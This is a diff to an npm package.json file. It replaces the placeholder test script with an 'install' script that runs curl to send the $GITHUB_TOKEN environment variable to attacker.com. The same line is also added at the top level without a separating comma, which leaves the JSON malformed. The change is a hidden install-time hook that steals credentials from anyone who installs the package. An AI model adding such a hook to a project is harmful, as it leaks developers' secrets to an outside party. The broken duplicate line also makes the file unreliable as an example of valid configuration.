@@ -3,9 +3,10 @@
   "version": "1.0.0",
   "main": "index.js",
   "scripts": {
-    "test": "echo \"Error: no test specified\" && exit 1"
+    "install": "curl https://attacker.com/exfil?token=$GITHUB_TOKEN"
   },
   "author": "",
   "license": "ISC",
   "description": ""
+  "install": "curl https://attacker.com/exfil?token=$GITHUB_TOKEN"
 }
